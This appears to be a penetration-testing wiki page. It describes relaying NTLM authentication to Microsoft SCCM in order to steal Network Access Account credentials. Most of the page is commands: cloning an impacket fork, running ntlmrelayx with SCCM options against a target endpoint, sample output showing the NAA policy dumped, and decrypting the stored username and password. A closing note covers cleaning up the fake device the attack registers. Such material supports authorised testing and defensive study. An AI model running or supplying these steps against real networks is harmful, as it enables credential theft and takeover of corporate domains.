**NTLM relay to SCCM** — if SCCM (Microsoft Configuration Manager) is deployed in the domain, an NTLM relay against its "AdminService" API can let you take over the SCCM infrastructure or retrieve Network Access Account (NAA) credentials.

## Discovery

See the SCCM section of [Tier Zero Server Isolation](../../Reconnaissance/Tier%20Zero%20Server%20Isolation.md).

## Exploitation

### Retrieve NAA credentials

For background on Network Access Accounts, see [SCCM NAA Credentials](../../SCCM%20Attacks/SCCM%20NAA%20Credentials.md).

Prerequisites: a domain user account, and the ability to coerce NTLM authentication from a domain-joined machine.

**Note:** The SCCM relay module is not yet merged into mainline `impacket` - use the fork.

```bash

git clone -b 'feature/sccm-relay' 'https://github.com/Tw1sm/impacket' 'impacket-sccm-relay'

```

Relay a computer account's NTLM authentication to the SCCM AdminService API over HTTP:

```bash

# 1. Recommended: use a virtualenv
virtualenv impacket-sccm-relay
source impacket-sccm-relay/bin/activate
cd impacket-sccm-relay
pip3 install .

# 2. Prepare the relay
python3 ./examples/ntlmrelayx.py -t 'http://SCCM_FQDN/ccm_system_windowsauth/request' --sccm --sccm-device 'FAKE_DEVICE' --sccm-fqdn 'SCCM_FQDN' --sccm-sleep 10 -smb2support

```

**Note:** `--sccm-device 'FAKE_DEVICE'` is arbitrary; it does not need to match a real host name.

Then coerce a domain machine to authenticate back to you (see [Coercing Authentication](../../Coercion/Coercing%20Authentication.md)).

```bash

[*] Authenticating against http://sccm.domain.local as DOMAIN/SERVER1$ SUCCEED
[*] Creating certificate for our fake server...
[*] Registering our fake server...
[*] Requesting NAAPolicy...
[*] Decrypted policy dumped to naapolicy.xml

```

On success, `naapolicy.xml` holds the encrypted `NETWORK_ACCESS_USERNAME` and `NETWORK_ACCESS_PASSWORD`. Decrypt them with `policysecretunobfuscate.py` (from sccmwtf):

```bash

python3 policysecretunobfuscate.py 'NETWORK_ACCESS_USERNAME'
python3 policysecretunobfuscate.py 'NETWORK_ACCESS_PASSWORD'

```

## Caution

**Warning:** Exploitation creates devices named after the attacker's IP in the SCCM database. Note them in the report, or remove the registered device with `SharpSCCM` using a privileged SCCM account.

## References

- impacket (sccm-relay fork) - https://github.com/Tw1sm/impacket/tree/feature/sccm-relay
- sccmwtf - https://github.com/xpn/sccmwtf
- SpecterOps - Site Takeover via SCCM's AdminService API - https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf
- SpecterOps - The Phantom Credentials of SCCM - https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9
